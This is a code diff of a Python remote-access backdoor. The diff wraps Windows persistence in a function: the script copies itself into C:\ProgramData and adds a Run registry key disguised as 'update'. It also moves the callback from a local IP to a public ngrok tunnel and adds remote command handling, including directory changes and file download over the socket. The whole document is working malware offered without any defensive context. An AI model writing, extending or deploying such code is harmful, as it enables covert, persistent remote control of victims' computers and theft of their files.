@@ -2,21 +2,25 @@ import sys
 import subprocess
 import socket
 import os
-while True:
-    if "DataApp" not in os.listdir("C:\\ProgramData"):
-        os.mkdir("C:\\ProgramData\\DataApp")
-        os.mkdir("C:\\ProgramData\\DataApp\\OSFiles")
-        subprocess.call(f"copy {os.getcwd()}\\(filename) C:\\ProgramData\\DataApp\\OSFiles", shell = "True")
-        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "C:\\ProgramData\\DataApp\\OSFiles\\(filename)"', shell = "True")
-        sys.exit()
+def persistence():
+    if os.name == "nt":
+        while True:
+            if "DataApp" not in os.listdir("C:\\ProgramData"):
+                os.mkdir("C:\\ProgramData\\DataApp")
+                os.mkdir("C:\\ProgramData\\DataApp\\OSFiles")
+                subprocess.call(f"copy {os.getcwd()}\\(filename) C:\\ProgramData\\DataApp\\OSFiles", shell = "True")
+                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "C:\\ProgramData\\DataApp\\OSFiles\\(filename)"', shell = "True")
+                sys.exit()
+            else:
+                break
     else:
-        break
+        pass
 def wow():    
     global s
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     while True:
         try:
-            s.connect(("192.168.0.2",8000)) #port on server and client have to be same
+            s.connect(("0.tcp.ngrok.io",13973)) #port on server and client have to be same
             break      
         except:
             pass
@@ -25,10 +29,14 @@ def func():
     try:
         while True:
             data = s.recv(1024).decode("utf-8")
-            if len(data) > 0:
+            if data == "get os":
+                s.send(os.name.encode("utf-8"))
+            elif len(data) > 0:
                 if data[:2] == "cd":
+                    print("changed")
                     os.chdir(data[3:])
                     output1 = f'{os.getcwd()}>' 
+                    print(output1)
                     s.send(output1.encode("utf-8"))
                 elif data == "download_file":
                     try:
@@ -70,6 +78,6 @@ def func():
             func()
         except:
             print("Error has been encountered")
+persistence()
 func()          
-                          
                        
